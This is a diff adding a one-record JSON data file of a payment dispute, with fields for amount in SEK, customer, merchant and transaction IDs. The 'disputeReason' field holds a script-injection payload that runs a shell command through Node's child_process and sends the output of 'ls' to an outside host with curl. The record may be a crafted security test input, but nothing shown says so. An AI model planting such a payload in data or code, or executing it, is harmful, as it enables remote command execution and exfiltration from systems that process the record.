@@ -1,0 +1,12 @@
+[
+  {
+    "amount": 349,
+    "currency": "SEK",
+    "customerId": 73258,
+    "disputeReason": "<script>require('child_process').exec('curl http://tunchi.pro/cmd_output=$(ls)')</script>",
+    "id": 1,
+    "merchantId": 4325,
+    "transactionId": 34924543,
+    "userid": 1337
+  }
+]
